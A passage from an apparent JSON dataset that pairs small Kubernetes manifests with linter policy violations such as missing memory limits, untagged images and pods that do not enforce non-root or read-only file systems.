    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: load-balancer-example\n  name: hello-world\nspec:\n  replicas: 5\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: load-balancer-example\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: load-balancer-example\n    spec:\n      containers:\n      - image: nikhil101/django-k8s:2.1\n        name: hello-world\n        ports:\n        - containerPort: 8000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hello-world\" has memory limit 0"
  },
  {
    "id": "3360",
    "manifest_path": "data/manifests/the_stack_sample/sample_1043.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3665\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3361",
    "manifest_path": "data/manifests/the_stack_sample/sample_1043.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3665\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "3362",
    "manifest_path": "data/manifests/the_stack_sample/sample_1043.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3665\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  }
]